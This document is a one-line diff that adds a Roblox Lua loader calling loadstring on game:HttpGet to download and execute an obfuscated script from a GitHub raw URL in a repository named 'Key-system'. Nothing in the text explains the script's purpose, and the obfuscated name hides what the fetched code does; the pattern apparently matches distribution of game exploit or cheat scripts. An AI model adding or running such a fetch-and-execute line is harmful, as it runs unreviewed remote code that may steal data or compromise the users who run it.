@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/qAxAp/Key-system/main/obf_hu6WvgMhBKaJ00bWiwn11vH1t6550jgTf7IW6Ze16cPZMIR9KCplxC4E04iI9hg8.lua'))()
